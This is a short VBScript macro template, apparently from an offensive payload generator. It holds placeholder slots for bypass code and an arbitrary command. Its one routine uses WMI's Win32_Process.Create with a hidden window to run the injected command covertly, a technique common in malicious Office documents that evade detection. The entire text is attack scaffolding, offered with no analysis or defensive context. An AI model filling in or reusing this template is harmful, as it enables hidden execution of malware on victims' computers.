
{{bypassCode}}
{{moduleCode}}

Sub wmi_exec
{{bypassCalls}}
{{moduleCalls}}
    Dim strComputer
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartUp = objWMIService.Get("Win32_ProcessStartup")
    Set objProc = objWMIService.Get("Win32_Process")
    Set procStartConfig = objStartUp.SpawnInstance_
    procStartConfig.ShowWindow = 0
    objProc.Create "{{command}}", Null, procStartConfig, intProcessID

End Sub
